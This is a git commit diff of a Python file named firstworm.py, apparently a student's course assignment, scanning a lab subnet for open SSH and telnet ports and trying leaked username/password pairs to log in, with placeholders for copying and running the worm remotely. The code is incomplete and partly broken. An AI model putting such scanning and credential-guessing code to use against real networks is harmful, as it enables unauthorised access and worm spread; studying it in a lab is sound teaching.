b96dbdb0462a461b79e796bed8415e9887400db1
decoteauamiuconn <idi24001@uconn.edu>
2025-10-10 02:19:31 +0000

    attempted findvulnerablemachines(); now how to attach worm to machine at x ip?

--- firstworm.py
+++ firstworm.py
@@ -32,20 +32,16 @@ import csv
 from itertools import product
 #recommended libraries; attempting to follow slides example
 
-#SSH_PORT = 22 # SSH port
-#TELNET_PORT = 23 # Telnet port
-
-usernames = [] #TODO: grab from csv
-passwords = [] #TODO: grab from csv
+usernames = [f""] #TODO: grab from csv
+passwords = [f""] #TODO: grab from csv
 IpAddr = "10.13.4." 
 lastdigit = range(0, 25) #test all IPs
 
-
+full_addresses = [f"{IpAddr}{x}" for x in lastdigit] #for loop; completed address for each in lastdigit
 
 while True: #infinite loop, instant start
     for user, pw in zip(usernames, passwords):
-        for ip in ip_addresses: #this needs to be edited to combine IpAddr and each digit for all in lastdigit
-        #for loop?
+        for ip in full_addresses: #this needs to be edited to combine IpAddr and each digit for all in lastdigit
             try:
                 # try to initiate SSH session - search for machines in 10.13.4.0/24 subnet
                 client = paramiko.client.SSHClient()
@@ -57,135 +53,45 @@ while True: #infinite loop, instant start
                     #contains list of IPs with open ssh and telnet ports respectively
 
                 def find_vulnerable_machines():
-                open_ssh = []
-                open_telnet = []
+                
+                    #These files should contain a list of IPs that correspond to 
+                    #machines that have open ssh and open telnet ports, respectively.
+
+                    #test for open ports
+                    
+
+
+                    open_ssh = []
+                    open_telnet = []
+                    for x in lastdigit: #iterate through digits
+                        ip = f"{IpAddr}{x}" #add last digit
+                        opensocket = socket.socket() #create a new socket
+                        try:
+                            opensocket.connect((ip)) #connect at ip
+                            open_ssh.append(ip) #add to list
+                            opensocket.close()
+                        except:
+                            pass
+                        try:
+                            tn = telnetlib.Telnet(ip) #connect at ip
+                            open_telnet.append(ip) #add to list
+                            tn.close()
+                        except:
+                            pass
 
                 # copy this worm program to remote machine
+                #find_vulnerable_machines()  
+                # ^ place here or between open and close?
+
+
                 # execute worm on remote machine
+
                 
                 # disconnect
                 client.close()
             except:
                 continue
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-#old code: likely works, but written with a lot of help from coPilot and may not fit assignment requirements exactly
-
-"""
-def check_port(ip, port):
-    try:
-        with socket.create_connection((ip, port), timeout=TIMEOUT):
-            return True
-    except Exception:
-        return False
-
-"""TODO Write a function, find_vulnerable_machines, that searches for machines in the 10. 13.4. 0/24 
-subnet and outputs two files, open_ssh. log and open_telnet. log. 
-These files should contain a list of IPs that correspond to machines that have open ssh and open telnet ports, respectively."""
-
-def find_vulnerable_machines():
-    open_ssh = []
-    open_telnet = []
-
-    for x in lastdigit:
-        ip = f"{IpAddr}{x}"
-        if check_port(ip, SSH_PORT):
-            open_ssh.append(ip)
-        try:
-            tn = telnetlib.Telnet(ip, TELNET_PORT, timeout=TIMEOUT)
-            open_telnet.append(ip)
-            tn.close()
-        except Exception:
-            pass
-
-    with open("open_ssh.log", "w") as ssh_log: #log IPS
-        for ip in open_ssh:
-            ssh_log.write(ip + "\n") #write each IP on a new line
-
-    with open("open_telnet.log", "w") as telnet_log: #log IPS
-        for ip in open_telnet:
-            telnet_log.write(ip + "\n") #write each IP on a new line
-
-    return open_ssh, open_telnet
-
-
-
-def scan_port(ip, port, timeout=2):
-    s = socket.socket()
-    s.settimeout(timeout)
-    try:
-        s.connect((ip, port))
-        s.close()
-        return True
-    except:
-        return False
-
-def get_open_ips(ip_list, port):
-    return [ip for ip in ip_list if scan_port(ip, port)]
-
-def try_telnet(ip, user, password):
-    try:
-        tn = telnetlib.Telnet(ip, 23, timeout=5)
-        tn.read_until(b"login: ")
-        tn.write(user.encode('ascii') + b"\n")
-        tn.read_until(b"Password: ")
-        tn.write(password.encode('ascii') + b"\n")
-        # Add logic to check for successful login
-        tn.close()
-        return True
-    except:
-        return False
-
-"""TODO Write a function, find vulnerable accounts, that searches over of the IPs within the log files from Part 1 
-and finds the user/password combinations from the leaked password database q2.csv that can be used to 
-successfully log in to the vulnerable machines via either SSH or telnet."""
-
-
-
-def try_ssh(ip, user, password):
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    try:
-        client.connect(ip, username=user, password=password, timeout=5)
-        client.close()
-        return True
-    except:
-        return False
-
-#Your function should write the exfiltrated SSH/telnet credentials to ssh_accounts. log and telnet_accounts. log, respectively.
-
-def import_credentials(filename): #import q2.csv here
-    with open(filename) as f:
-        return [row for row in csv.DictReader(f)] #returns each row as a dictionary
-
-"""
 
 if __name__ == "__main__":
     #check_port()
